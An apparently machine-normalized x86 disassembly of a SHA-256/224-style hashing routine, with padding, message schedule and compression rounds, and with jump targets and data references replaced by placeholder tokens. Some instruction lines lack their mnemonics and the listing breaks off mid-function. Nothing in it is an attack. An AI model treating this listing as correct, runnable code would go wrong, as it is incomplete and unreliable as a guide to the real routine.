lea esi [ eax + ecx ]
mov ecx 0x10
xor eax eax
lea edi [ ebx + 0x28 ]
mov [ ebx + 0x68 ] 0x0
[ edi ]
lea ecx [ eax + ebp ]
cmp ecx 0x40
jae r-xdata
mov ecx ebp
lea edi [ ebx + 0x28 ]
mov edx ecx
mov [ ebx + 0x68 ] ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx ebp
lea edi [ edx + eax ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0x68 ]
pop edi
add eax ebp
pop esi
mov [ ebx + 0x68 ] eax
pop ebp
mov eax 0x1
pop ebx
retn
sub_1003b2a0
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
mov edi [ ebx + 0x68 ]
lea esi [ ebx + 0x28 ]
mov [ edi + esi ] 0x80
inc edi
cmp edi 0x38
jbe r-xdata
mov ecx 0x38
xor eax eax
sub ecx edi
add edi esi
mov edx ecx
add esi 0x38
shr ecx 0x2
[ edi ]
mov ecx edx
push 0x1
and ecx 0x3
[ edi ]
mov eax [ ebx + 0x24 ]
shr eax 0x18
mov [ esi ] al
mov ecx [ ebx + 0x24 ]
inc esi
shr ecx 0x10
mov [ esi ] cl
mov edx [ ebx + 0x24 ]
inc esi
shr edx 0x8
mov [ esi ] dl
mov al [ ebx + 0x24 ]
inc esi
mov [ esi ] al
mov ecx [ ebx + 0x20 ]
inc esi
shr ecx 0x18
mov [ esi ] cl
mov edx [ ebx + 0x20 ]
inc esi
shr edx 0x10
mov [ esi ] dl
mov eax [ ebx + 0x20 ]
inc esi
shr eax 0x8
mov [ esi ] al
mov cl [ ebx + 0x20 ]
inc esi
mov [ esi ] cl
sub esi 0x3f
push esi
push ebx
call sub_1003b430
mov ecx 0x10
xor eax eax
mov edi esi
mov [ ebx + 0x68 ] 0x0
[ edi ]
mov eax [ ebx + 0x6c ]
add esp 0xc
cmp eax 0x1c
je r-xdata
mov ecx 0x40
xor eax eax
sub ecx edi
add edi esi
mov edx ecx
push 0x1
shr ecx 0x2
[ edi ]
mov ecx edx
push esi
and ecx 0x3
push ebx
[ edi ]
xor edi edi
call sub_1003b430
add esp 0xc
mov eax [ esp + 0x10 ]
mov esi ebx
mov edi 0x7
cmp eax 0x20
je r-xdata
mov ecx [ esi ]
add esi 0x4
mov edx ecx
shr edx 0x18
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x10
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x8
mov [ eax ] dl
inc eax
mov [ eax ] cl
inc eax
dec edi
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
retn
mov eax [ esp + 0x10 ]
mov esi ebx
mov edi 0x8
ja r-xdata
mov ecx [ esi ]
add esi 0x4
mov edx ecx
shr edx 0x18
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x10
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x8
mov [ eax ] dl
inc eax
mov [ eax ] cl
inc eax
dec edi
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
retn
pop edi
pop esi
xor eax eax
pop ebx
retn
xor esi esi
test eax 0xfffffffc
jbe r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
retn
mov eax [ esp + 0x10 ]
mov edi ebx
mov ecx [ edi ]
add edi 0x4
mov edx ecx
shr edx 0x18
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x10
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x8
mov [ eax ] dl
inc eax
mov [ eax ] cl
mov ecx [ ebx + 0x6c ]
inc eax
inc esi
shr ecx 0x2
cmp esi ecx
jb r-xdata
sub_1003b430
mov eax 0x84
call sub_1001d0d0
mov ecx [ esp + 0x90 ]
mov eax [ esp + 0x8c ]
mov edx ecx
dec ecx
test edx edx
je r-xdata
add esp 0x84
retn
mov edx [ esp + 0x88 ]
push ebx
push ebp
inc ecx
push esi
push edi
mov [ esp + 0x50 ] ecx
mov ebx edx
and ebx 0xf
lea ebx [ esp + ebx * 4 + 0x54 ]
mov [ esp + 0x18 ] ebx
mov ebx [ ebx ]
mov [ esp + 0x10 ] ebx
lea ebx [ edx - 0x3 ]
and ebx 0xf
dec edx
and edx 0xf
lea ebx [ esp + ebx * 4 + 0x54 ]
mov [ esp + 0x48 ] ebx
lea edx [ esp + edx * 4 + 0x54 ]
mov ebx [ ebx ]
mov [ esp + 0x44 ] edx
mov ebp ebx
mov edx ebx
rol ebp 0xf
rol edx 0xd
xor ebp edx
mov edx [ esp + 0x10 ]
shr ebx 0xa
xor ebp ebx
mov ebx edx
rol ebx 0x19
rol edx 0xe
xor ebx edx
mov edx [ esp + 0x10 ]
shr edx 0x3
xor ebx edx
mov edx [ esp + 0x38 ]
add edx 0xfffffff8
add ebp ebx
and edx 0xf
mov ebx [ esp + edx * 4 + 0x54 ]
mov edx [ esp + 0x44 ]
add ebp ebx
mov ebx [ edx ]
add ebx ebp
mov [ edx ] ebx
mov edx [ esp + 0x20 ]
mov ebx edx
mov ebp edx
rol ebx 0x1a
rol ebp 0x15
xor ebx ebp
mov ebp edx
rol ebp 0x7
xor ebx ebp
mov ebp ecx
mov [ esp + 0x30 ] ebx
mov ebx edx
not ebx
and ebx esi
and ebp edx
mov edx [ esp + 0x30 ]
xor ebx ebp
add edx ebx
mov ebx [ esp + 0x34 ]
mov ebp [ ebx - 0x4 ]
mov ebx [ esp + 0x44 ]
add edx ebp
mov ebp [ ebx ]
mov ebx [ esp + 0x2c ]
add edx ebp
mov ebp [ esp + 0x28 ]
add edx ebp
add ebx edx
mov [ esp + 0x10 ] edx
mov edx [ esp + 0x24 ]
mov [ esp + 0x2c ] ebx
mov ebx edi
mov ebp edx
xor ebx edx
mov [ esp + 0x40 ] ebx
mov ebx edi
and ebx edx
mov [ esp + 0x3c ] ebx
mov ebx edx
rol ebx 0x1e
rol ebp 0x13
xor ebx ebp
mov ebp [ esp + 0x40 ]
rol edx 0xa
xor ebx edx
mov edx [ esp + 0x14 ]
and ebp edx
mov edx [ esp + 0x3c ]
xor ebp edx
mov edx [ esp + 0x10 ]
add edx ebx
mov ebx [ esp + 0x38 ]
add ebp edx
lea edx [ ebx + 0x1 ]
add ebx 0xfffffffe
and edx 0xf
and ebx 0xf
mov [ esp + 0x28 ] ebp
lea edx [ esp + edx * 4 + 0x54 ]
mov [ esp + 0x30 ] edx
mov edx [ edx ]
mov [ esp + 0x10 ] edx
lea edx [ esp + ebx * 4 + 0x54 ]
mov [ esp + 0x4c ] edx
mov edx [ edx ]
mov ebx edx
mov ebp edx
rol ebx 0xf
rol ebp 0xd
xor ebx ebp
shr edx 0xa
xor ebx edx
mov edx [ esp + 0x10 ]
mov ebp edx
rol ebp 0x19
rol edx 0xe
xor ebp edx
mov edx [ esp + 0x10 ]
shr edx 0x3
xor ebp edx
mov edx [ esp + 0x38 ]
add edx 0xfffffff9
add ebx ebp
and edx 0xf
mov ebp [ esp + edx * 4 + 0x54 ]
mov edx [ esp + 0x18 ]
add ebx ebp
mov ebp [ edx ]
add ebp ebx
mov [ edx ] ebp
mov edx ebp
mov [ esp + 0x10 ] edx
mov edx [ esp + 0x2c ]
mov ebp edx
mov ebx edx
rol ebp 0x1a
rol ebx 0x15
xor ebp ebx
mov ebx edx
rol ebx 0x7
xor ebp ebx
mov ebx edx
not ebx
and ebx ecx
mov [ esp + 0x1c ] ebx
mov ebx [ esp + 0x20 ]
and ebx edx
mov edx [ esp + 0x1c ]
xor edx ebx
mov ebx [ esp + 0x10 ]
add ebx ebp
add edx ebx
mov ebx [ esp + 0x34 ]
mov ebp [ ebx ]
mov ebx [ esp + 0x14 ]
add edx ebp
add edx esi
add ebx edx
mov [ esp + 0x14 ] ebx
mov ebx [ esp + 0x28 ]
mov ebp ebx
rol ebp 0x1e
mov esi ebx
rol esi 0x13
xor ebp esi
mov esi ebx
rol esi 0xa
xor ebp esi
mov esi [ esp + 0x40 ]
and esi ebx
mov ebx [ esp + 0x3c ]
add edx ebp
xor esi ebx
add esi edx
mov edx [ esp + 0x38 ]
add edx 0x2
and edx 0xf
lea edx [ esp + edx * 4 + 0x54 ]
mov [ esp + 0x40 ] edx
mov edx [ edx ]
mov [ esp + 0x10 ] edx
mov edx [ esp + 0x44 ]
mov edx [ edx ]
mov ebx edx
mov ebp edx
rol ebx 0xf
rol ebp 0xd
xor ebx ebp
shr edx 0xa
xor ebx edx
mov edx [ esp + 0x10 ]
mov ebp edx
rol ebp 0x19
rol edx 0xe
xor ebp edx
mov edx [ esp + 0x10 ]
shr edx 0x3
xor ebp edx
mov edx [ esp + 0x38 ]
add edx 0xfffffffa
add ebx ebp
and edx 0xf
mov ebp [ esp + edx * 4 + 0x54 ]
mov edx [ esp + 0x30 ]
add ebx ebp
mov ebp [ edx ]
add ebp ebx
mov [ edx ] ebp
mov edx [ esp + 0x14 ]
mov ebx edx
mov ebp edx
rol ebx 0x1a
rol ebp 0x15
xor ebx ebp
mov ebp edx
rol ebp 0x7
xor ebx ebp
mov ebp [ esp + 0x20 ]
mov [ esp + 0x3c ] ebx
mov ebx edx
not ebx
and ebx ebp
mov ebp [ esp + 0x2c ]
and ebp edx
mov edx [ esp + 0x3c ]
xor ebx ebp
add edx ebx
mov ebx [ esp + 0x34 ]
mov ebp [ ebx + 0x4 ]
mov ebx [ esp + 0x30 ]
add edx ebp
add edx [ ebx ]
add edx ecx
mov ecx esi
mov [ esp + 0x10 ] edx
add edi edx
mov edx esi
mov [ esp + 0x1c ] edi
rol edx 0x1e
rol ecx 0x13
xor edx ecx
mov ecx esi
mov ebp [ esp + 0x28 ]
mov ebx esi
rol ecx 0xa
xor edx ecx
mov ecx [ esp + 0x24 ]
xor ebx ecx
and ebx ebp
mov ebp esi
and ebp ecx
mov ecx [ esp + 0x10 ]
add ecx edx
mov edx [ esp + 0x38 ]
add edx 0x3
xor ebx ebp
and edx 0xf
add ecx ebx
lea edx [ esp + edx * 4 + 0x54 ]
mov [ esp + 0x3c ] edx
mov edx [ edx ]
mov [ esp + 0x10 ] edx
mov edx [ esp + 0x18 ]
mov edx [ edx ]
mov ebx edx
mov ebp edx
rol ebx 0xf
rol ebp 0xd
xor ebx ebp
shr edx 0xa
xor ebx edx
mov edx [ esp + 0x10 ]
mov ebp edx
rol ebp 0x19
rol edx 0xe
xor ebp edx
mov edx [ esp + 0x10 ]
shr edx 0x3
xor ebp edx
mov edx [ esp + 0x38 ]
add edx 0xfffffffb
add ebx ebp
and edx 0xf
mov ebp [ esp + edx * 4 + 0x54 ]
mov edx [ esp + 0x40 ]
add ebx ebp
mov ebp [ edx ]
add ebp ebx
mov ebx edi
mov [ edx ] ebp
mov edx ebp
mov [ esp + 0x18 ] edx
mov edx edi
rol edx 0x1a
rol ebx 0x15
xor edx ebx
mov ebp [ esp + 0x2c ]
mov ebx edi
rol ebx 0x7
xor edx ebx
mov ebx edi
not ebx
and ebx ebp
mov ebp [ esp + 0x14 ]
and ebp edi
xor ebx ebp
add edx ebx
mov ebx [ esp + 0x34 ]
mov ebp [ ebx + 0x8 ]
mov ebx [ esp + 0x18 ]
add edx ebp
mov ebp [ esp + 0x20 ]
add edx ebx
mov ebx [ esp + 0x24 ]
add edx ebp
add ebx edx
mov [ esp + 0x10 ] edx
mov [ esp + 0x24 ] ebx
mov ebx ecx
mov edx ecx
rol ebx 0x1e
rol edx 0x13
xor ebx edx
mov edx ecx
mov ebp esi
rol edx 0xa
xor ebx edx
mov edx [ esp + 0x28 ]
xor ebp ecx
and ebp edx
mov edx esi
and edx ecx
xor ebp edx
mov edx [ esp + 0x10 ]
add edx ebx
add ebp edx
mov edx [ esp + 0x38 ]
add edx 0x4
mov [ esp + 0x20 ] ebp
and edx 0xf
lea edx [ esp + edx * 4 + 0x54 ]
mov [ esp + 0x18 ] edx
mov edx [ edx ]
mov [ esp + 0x10 ] edx
mov edx [ esp + 0x30 ]
mov edx [ edx ]
mov ebx edx
mov ebp edx
rol ebx 0xf
rol ebp 0xd
xor ebx ebp
shr edx 0xa
xor ebx edx
mov edx [ esp + 0x10 ]
mov ebp edx
rol ebp 0x19
rol edx 0xe
xor ebp edx
mov edx [ esp + 0x10 ]
shr edx 0x3
xor ebp edx
mov edx [ esp + 0x38 ]
add edx 0xfffffffc
add ebx ebp
and edx 0xf
mov ebp [ esp + edx * 4 + 0x54 ]
mov edx [ esp + 0x3c ]
add ebx ebp
mov ebp [ edx ]
add ebp ebx
mov ebx [ esp + 0x24 ]
mov [ edx ] ebp
mov edx ebp
mov [ esp + 0x30 ] edx
mov edx ebx
mov ebp ebx
rol edx 0x1a
rol ebp 0x15
xor edx ebp
mov ebp ebx
rol ebp 0x7
xor edx ebp
mov ebp [ esp + 0x14 ]
not ebx
and ebx ebp
mov ebp [ esp + 0x24 ]
and edi ebp
mov ebp [ esp + 0x30 ]
xor ebx edi
mov edi [ esp + 0x34 ]
add edx ebx
mov ebx [ edi + 0xc ]
mov edi [ esp + 0x28 ]
add edx ebx
mov ebx [ esp + 0x2c ]
add edx ebp
add edx ebx
add edi edx
mov [ esp + 0x10 ] edx
mov [ esp + 0x28 ] edi
mov edi [ esp + 0x20 ]
mov ebx edi
mov edx edi
rol ebx 0x1e
rol edx 0x13
xor ebx edx
mov edx edi
rol edx 0xa
mov ebp ecx
xor ebx edx
xor ebp edi
mov edx ecx
and edx edi
and ebp esi
xor ebp edx
mov edx [ esp + 0x10 ]
add edx ebx
add ebp edx
mov edx [ esp + 0x38 ]
add edx 0x5
mov [ esp + 0x2c ] ebp
and edx 0xf
lea edx [ esp + edx * 4 + 0x54 ]
mov [ esp + 0x30 ] edx
mov edx [ edx ]
mov [ esp + 0x10 ] edx
mov edx [ esp + 0x40 ]
mov edx [ edx ]
mov ebx edx
mov ebp edx
rol ebx 0xf
rol ebp 0xd
xor ebx ebp
shr edx 0xa
xor ebx edx
mov edx [ esp + 0x10 ]
mov ebp edx
rol ebp 0x19
rol edx 0xe
xor ebp edx
mov edx [ esp + 0x10 ]
shr edx 0x3
xor ebp edx
mov edx [ esp + 0x48 ]
add ebx ebp
mov ebp [ edx ]
mov edx [ esp + 0x18 ]
add ebx ebp
mov ebp [ edx ]
add ebp ebx
mov ebx [ esp + 0x28 ]
mov [ edx ] ebp
mov edx ebp
mov [ esp + 0x48 ] edx
mov edx ebx
mov ebp ebx
rol edx 0x1a
rol ebp 0x15
xor edx ebp
mov ebp ebx
rol ebp 0x7
xor edx ebp
mov ebp ebx
and ebx [ esp + 0x24 ]
not ebp
and ebp [ esp + 0x1c ]
xor ebp ebx
mov ebx [ esp + 0x34 ]
add edx ebp
mov ebp [ ebx + 0x10 ]
mov ebx [ esp + 0x48 ]
add edx ebp
mov ebp [ esp + 0x14 ]
add edx ebx
mov ebx [ esp + 0x2c ]
add edx ebp
mov ebp ebx
mov [ esp + 0x10 ] edx
add esi edx
mov edx ebx
rol ebp 0x1e
rol edx 0x13
xor ebp edx
mov edx ebx
rol edx 0xa
xor ebp edx
mov edx [ esp + 0x10 ]
mov [ esp + 0x48 ] ebp
mov ebp edi
xor ebp ebx
and edi ebx
and ebp ecx
xor ebp edi
mov edi [ esp + 0x48 ]
add edx edi
add ebp edx
mov edx [ esp + 0x38 ]
add edx 0x6
mov [ esp + 0x14 ] ebp
and edx 0xf
lea edx [ esp + edx * 4 + 0x54 ]
mov [ esp + 0x48 ] edx
mov edx [ edx ]
mov [ esp + 0x10 ] edx
mov edx [ esp + 0x3c ]
mov edx [ edx ]
mov edi edx
mov ebp edx
rol edi 0xf
rol ebp 0xd
xor edi ebp
shr edx 0xa
xor edi edx
mov edx [ esp + 0x10 ]
mov ebp edx
rol ebp 0x19
rol edx 0xe
xor ebp edx
mov edx [ esp + 0x10 ]
shr edx 0x3
xor ebp edx
mov edx [ esp + 0x4c ]
add edi ebp
mov ebp [ edx ]
mov edx [ esp + 0x30 ]
add edi ebp
mov ebp [ edx ]
add ebp edi
mov edi esi
mov [ edx ] ebp
mov edx ebp
mov [ esp + 0x4c ] edx
mov edx esi
rol edx 0x1a
rol edi 0x15
xor edx edi
mov ebp [ esp + 0x24 ]
mov edi esi
rol edi 0x7
xor edx edi
mov edi esi
not edi
and edi ebp
mov ebp [ esp + 0x28 ]
and ebp esi
xor edi ebp
add edx edi
mov edi [ esp + 0x34 ]
mov ebp [ edi + 0x14 ]
mov edi [ esp + 0x4c ]
add edx ebp
mov ebp [ esp + 0x1c ]
add edx edi
add edx ebp
mov [ esp + 0x10 ] edx
add ecx edx
mov edx [ esp + 0x14 ]
mov edi edx
mov ebp edx
rol edi 0x1e
rol ebp 0x13
xor edi ebp
mov ebp edx
rol ebp 0xa
xor edi ebp
mov ebp ebx
xor ebp edx
and ebx edx
and ebp [ esp + 0x20 ]
mov edx [ esp + 0x10 ]
add edx edi
xor ebp ebx
add ebp edx
mov edx [ esp + 0x38 ]
add edx 0x7
mov edi ebp
and edx 0xf
mov edx [ esp + edx * 4 + 0x54 ]
mov [ esp + 0x10 ] edx
mov edx [ esp + 0x18 ]
mov edx [ edx ]
mov ebx edx
mov ebp edx
rol ebx 0xf
rol ebp 0xd
xor ebx ebp
shr edx 0xa
xor ebx edx
mov edx [ esp + 0x10 ]
mov ebp edx
rol ebp 0x19
rol edx 0xe
xor ebp edx
mov edx [ esp + 0x10 ]
shr edx 0x3
xor ebp edx
mov edx [ esp + 0x44 ]
add ebx ebp
mov ebp [ edx ]
mov edx [ esp + 0x48 ]
add ebx ebp
mov ebp [ edx ]
add ebp ebx
mov ebx ecx
mov [ edx ] ebp
mov edx ebp
mov [ esp + 0x4c ] edx
mov edx ecx
rol edx 0x1a
rol ebx 0x15
xor edx ebx
mov ebp [ esp + 0x28 ]
mov ebx ecx
rol ebx 0x7
xor edx ebx
mov ebx ecx
not ebx
and ebx ebp
mov ebp esi
and ebp ecx
xor ebx ebp
add edx ebx
mov ebx [ esp + 0x34 ]
mov ebp [ ebx + 0x18 ]
mov ebx [ esp + 0x4c ]
add edx ebp
mov ebp [ esp + 0x24 ]
add edx ebx
mov ebx [ esp + 0x20 ]
add edx ebp
add ebx edx
mov [ esp + 0x10 ] edx
mov [ esp + 0x20 ] ebx
mov ebx edi
mov edx edi
rol ebx 0x1e
rol edx 0x13
xor ebx edx
mov edx edi
rol edx 0xa
xor ebx edx
mov edx [ esp + 0x14 ]
mov ebp edx
and edx edi
xor ebp edi
and ebp [ esp + 0x2c ]
xor ebp edx
mov edx [ esp + 0x10 ]
add edx ebx
add ebp edx
mov edx [ esp + 0x38 ]
mov ebx ebp
mov ebp [ esp + 0x34 ]
add edx 0x8
add ebp 0x20
mov [ esp + 0x34 ] ebp
mov [ esp + 0x24 ] ebx
lea ebp [ edx - 0x1 ]
mov [ esp + 0x38 ] edx
cmp ebp 0x40
jl r-xdata
mov edx [ esp + 0x98 ]
mov ebp [ edx ]
add ebp ebx
mov ebx [ edx + 0x4 ]
add ebx edi
mov edi [ edx + 0x8 ]
mov [ edx + 0x4 ] ebx
mov ebx [ esp + 0x14 ]
add edi ebx
mov ebx [ esp + 0x2c ]
mov [ edx + 0x8 ] edi
mov edi [ edx + 0xc ]
add edi ebx
mov ebx [ esp + 0x20 ]
mov [ edx + 0xc ] edi
mov edi [ edx + 0x10 ]
add edi ebx
mov [ edx ] ebp
mov [ edx + 0x10 ] edi
mov edi [ edx + 0x14 ]
add edi ecx
mov ecx [ edx + 0x18 ]
add ecx esi
mov esi [ esp + 0x28 ]
mov [ edx + 0x18 ] ecx
mov ecx [ edx + 0x1c ]
add ecx esi
mov [ edx + 0x14 ] edi
mov [ edx + 0x1c ] ecx
mov ecx [ esp + 0x50 ]
dec ecx
mov [ esp + 0x50 ] ecx
jne r-xdata
mov ecx [ edx + 0x4 ]
mov ebp [ edx ]
mov [ esp + 0x1c ] ecx
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0xc ]
mov esi [ edx + 0x10 ]
mov ebx [ edx + 0x18 ]
mov [ esp + 0x14 ] ecx
mov ecx [ edx + 0x14 ]
mov edx [ edx + 0x1c ]
mov [ esp + 0x44 ] ecx
xor ecx ecx
mov cl [ eax ]
mov [ esp + 0x30 ] edx
shl ecx 0x18
inc eax
xor edx edx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x34 ] esi
mov dl [ eax ]
shl edx 0x10
or ecx edx
inc eax
xor edx edx
mov dh [ eax ]
or ecx edx
inc eax
xor edx edx
mov dl [ eax ]
or ecx edx
mov edx esi
mov [ esp + 0x10 ] ecx
mov [ esp + 0x54 ] ecx
mov ecx esi
inc eax
rol edx 0x1a
rol ecx 0x15
xor edx ecx
mov ecx esi
rol ecx 0x7
xor edx ecx
mov ecx esi
not ecx
and ecx ebx
mov ebx [ esp + 0x44 ]
mov [ esp + 0x18 ] edx
mov edx [ esp + 0x10 ]
and ebx esi
mov esi [ esp + 0x18 ]
xor ecx ebx
mov ebx [ r--data ]
add edx esi
mov esi [ esp + 0x30 ]
add ecx edx
mov edx [ esp + 0x1c ]
add ecx ebx
mov ebx ebp
add ecx esi
mov esi edx
and edx ebp
add edi ecx
mov [ esp + 0x3c ] edx
mov edx ebp
xor esi ebp
mov [ esp + 0x2c ] edi
rol edx 0x1e
rol ebx 0x13
xor edx ebx
mov ebx ebp
rol ebx 0xa
xor edx ebx
mov ebx [ esp + 0x14 ]
mov [ esp + 0x40 ] esi
and esi ebx
mov ebx [ esp + 0x3c ]
add ecx edx
xor esi ebx
add esi ecx
xor ecx ecx
mov cl [ eax ]
shl ecx 0x18
inc eax
xor edx edx
mov ebx edi
mov dl [ eax ]
shl edx 0x10
or ecx edx
inc eax
xor edx edx
mov dh [ eax ]
or ecx edx
inc eax
xor edx edx
mov dl [ eax ]
or ecx edx
mov edx edi
mov [ esp + 0x10 ] ecx
mov [ esp + 0x58 ] ecx
mov ecx edi
inc eax
rol ebx 0x1a
rol ecx 0x15
xor ebx ecx
mov ecx edi
rol edx 0x7
xor ebx edx
mov edx [ esp + 0x44 ]
not ecx
and ecx edx
mov edx [ esp + 0x34 ]
and edx edi
xor ecx edx
mov edx [ esp + 0x10 ]
add edx ebx
mov ebx [ esp + 0x20 ]
add ecx edx
mov edx [ r--data ]
add ecx edx
mov edx [ esp + 0x14 ]
add ecx ebx
mov ebx esi
add edx ecx
mov [ esp + 0x10 ] ecx
mov ecx esi
mov [ esp + 0x14 ] edx
rol ebx 0x1e
rol ecx 0x13
mov edx esi
xor ebx ecx
mov ecx [ esp + 0x40 ]
rol edx 0xa
xor ebx edx
mov edx [ esp + 0x3c ]
and ecx esi
xor ecx edx
mov edx [ esp + 0x10 ]
add edx ebx
add ecx edx
xor edx edx
mov [ esp + 0x20 ] ecx
xor ecx ecx
mov cl [ eax ]
mov dl [ eax + 0x1 ]
shl ecx 0x18
inc eax
shl edx 0x10
or ecx edx
inc eax
xor edx edx
mov dh [ eax ]
or ecx edx
inc eax
xor edx edx
mov dl [ eax ]
or ecx edx
inc eax
mov [ esp + 0x10 ] ecx
mov [ esp + 0x5c ] ecx
mov ecx [ esp + 0x14 ]
mov ebx ecx
mov edx ecx
rol ebx 0x1a
rol edx 0x15
xor ebx edx
mov edx ecx
rol edx 0x7
xor ebx edx
mov edx [ esp + 0x34 ]
not ecx
and ecx edx
mov edx edi
mov [ esp + 0x18 ] ecx
mov ecx [ esp + 0x14 ]
and edx ecx
mov ecx [ esp + 0x18 ]
xor ecx edx
mov edx [ esp + 0x10 ]
add edx ebx
mov ebx [ esp + 0x44 ]
add ecx edx
mov edx [ r--data ]
add ecx edx
mov edx [ esp + 0x1c ]
add ecx ebx
add edx ecx
mov [ esp + 0x10 ] ecx
mov [ esp + 0x1c ] edx
mov edx [ esp + 0x20 ]
mov ebx edx
mov ecx edx
rol ebx 0x1e
rol ecx 0x13
xor ebx ecx
mov ecx edx
rol ecx 0xa
xor ebx ecx
mov ecx edx
xor ecx ebp
and edx ebp
and ecx esi
xor ecx edx
mov edx [ esp + 0x10 ]
add edx ebx
xor ebx ebx
add ecx edx
xor edx edx
mov dl [ eax ]
mov bl [ eax + 0x1 ]
shl edx 0x18
inc eax
shl ebx 0x10
or edx ebx
inc eax
xor ebx ebx
mov bh [ eax ]
or edx ebx
inc eax
xor ebx ebx
mov bl [ eax ]
or edx ebx
inc eax
mov [ esp + 0x10 ] edx
mov [ esp + 0x60 ] edx
mov edx [ esp + 0x1c ]
mov ebx edx
rol ebx 0x1a
rol edx 0x15
xor ebx edx
mov edx [ esp + 0x1c ]
rol edx 0x7
xor ebx edx
mov edx [ esp + 0x1c ]
not edx
and edx edi
mov edi [ esp + 0x14 ]
mov [ esp + 0x18 ] edx
mov edx [ esp + 0x1c ]
and edi edx
mov edx [ esp + 0x18 ]
xor edx edi
mov edi [ esp + 0x10 ]
add edi ebx
add edx edi
mov edi [ r--data ]
mov ebx [ esp + 0x34 ]
add edx edi
add edx ebx
mov ebx ecx
add ebp edx
mov [ esp + 0x10 ] edx
mov edx ecx
mov [ esp + 0x24 ] ebp
rol ebx 0x1e
rol edx 0x13
xor ebx edx
mov edx ecx
rol edx 0xa
xor ebx edx
mov edx [ esp + 0x20 ]
mov edi edx
and edx ecx
xor edi ecx
and edi esi
xor edi edx
mov edx [ esp + 0x10 ]
add edx ebx
xor ebx ebx
add edi edx
xor edx edx
mov dl [ eax ]
mov bl [ eax + 0x1 ]
shl edx 0x18
inc eax
shl ebx 0x10
or edx ebx
inc eax
xor ebx ebx
mov bh [ eax ]
or edx ebx
inc eax
xor ebx ebx
mov bl [ eax ]
or edx ebx
mov ebx ebp
mov [ esp + 0x10 ] edx
mov [ esp + 0x64 ] edx
mov edx ebp
inc eax
rol ebx 0x1a
rol edx 0x15
xor ebx edx
mov edx ebp
rol edx 0x7
xor ebx edx
mov edx [ esp + 0x14 ]
not ebp
and ebp edx
mov edx [ esp + 0x24 ]
mov [ esp + 0x18 ] ebp
mov ebp [ esp + 0x1c ]
and ebp edx
mov edx [ esp + 0x18 ]
mov [ esp + 0x18 ] ebx
mov ebx [ esp + 0x10 ]
xor edx ebp
mov ebp [ esp + 0x18 ]
add ebx ebp
mov ebp [ esp + 0x2c ]
add edx ebx
mov ebx [ r--data ]
add edx ebx
mov ebx edi
add edx ebp
mov ebp ecx
mov [ esp + 0x10 ] edx
add esi edx
mov edx edi
mov [ esp + 0x28 ] esi
rol ebx 0x1e
rol edx 0x13
xor ebx edx
mov edx edi
rol edx 0xa
xor ebx edx
mov edx [ esp + 0x20 ]
xor ebp edi
and ebp edx
mov edx ecx
and edx edi
xor ebp edx
mov edx [ esp + 0x10 ]
add edx ebx
xor ebx ebx
add ebp edx
xor edx edx
mov dl [ eax ]
mov bl [ eax + 0x1 ]
shl edx 0x18
inc eax
shl ebx 0x10
or edx ebx
inc eax
xor ebx ebx
mov bh [ eax ]
or edx ebx
inc eax
xor ebx ebx
mov bl [ eax ]
or edx ebx
mov ebx esi
mov [ esp + 0x10 ] edx
mov [ esp + 0x68 ] edx
mov edx esi
inc eax
rol ebx 0x1a
rol edx 0x15
xor ebx edx
mov edx esi
rol edx 0x7
xor ebx edx
mov edx [ esp + 0x1c ]
not esi
and esi edx
mov edx [ esp + 0x24 ]
mov [ esp + 0x18 ] esi
mov esi [ esp + 0x28 ]
and esi edx
mov edx [ esp + 0x18 ]
xor edx esi
mov esi [ esp + 0x10 ]
add esi ebx
mov ebx [ esp + 0x14 ]
add edx esi
mov esi [ r--data ]
add edx esi
mov esi [ esp + 0x20 ]
add edx ebx
mov ebx ebp
mov [ esp + 0x10 ] edx
add esi edx
mov edx ebp
mov [ esp + 0x20 ] esi
rol ebx 0x1e
rol edx 0x13
xor ebx edx
mov edx ebp
rol edx 0xa
xor ebx edx
mov edx edi
xor edx ebp
mov esi edi
and edx ecx
and esi ebp
xor edx esi
mov esi [ esp + 0x10 ]
add esi ebx
add edx esi
mov [ esp + 0x14 ] edx
xor edx edx
mov dl [ eax ]
mov esi edx
shl esi 0x18
inc eax
xor edx edx
mov dl [ eax ]
shl edx 0x10
or esi edx
inc eax
xor edx edx
mov dh [ eax ]
or esi edx
inc eax
xor edx edx
mov dl [ eax ]
or esi edx
mov edx [ esp + 0x20 ]
mov [ esp + 0x10 ] esi
mov [ esp + 0x6c ] esi
mov ebx edx
mov esi edx
rol ebx 0x1a
rol esi 0x15
xor ebx esi
mov esi edx
rol esi 0x7
xor ebx esi
mov esi [ esp + 0x24 ]
not edx
and edx esi
mov esi [ esp + 0x28 ]
mov [ esp + 0x18 ] edx
mov edx [ esp + 0x20 ]
and esi edx
mov edx [ esp + 0x18 ]
xor edx esi
mov esi [ esp + 0x10 ]
add esi ebx
mov ebx [ r--data ]
add edx esi
mov esi [ esp + 0x1c ]
add edx ebx
inc eax
add edx esi
mov [ esp + 0x10 ] edx
add ecx edx
mov edx [ esp + 0x14 ]
mov ebx edx
mov esi edx
rol ebx 0x1e
rol esi 0x13
xor ebx esi
mov esi edx
rol esi 0xa
xor ebx esi
mov esi ebp
xor esi edx
mov [ esp + 0x30 ] ebx
mov ebx ebp
and esi edi
and ebx edx
mov edx [ esp + 0x10 ]
mov [ esp + 0x18 ] esi
xor esi ebx
mov ebx [ esp + 0x30 ]
add edx ebx
add esi edx
xor edx edx
mov dl [ eax ]
mov [ esp + 0x1c ] esi
mov esi edx
xor edx edx
mov dl [ eax + 0x1 ]
shl esi 0x18
inc eax
shl edx 0x10
or esi edx
inc eax
xor edx edx
mov dh [ eax ]
or esi edx
inc eax
xor edx edx
mov dl [ eax ]
or esi edx
inc eax
mov [ esp + 0x10 ] esi
mov ebx ecx
mov edx ecx
rol ebx 0x1a
rol edx 0x15
xor ebx edx
mov edx ecx
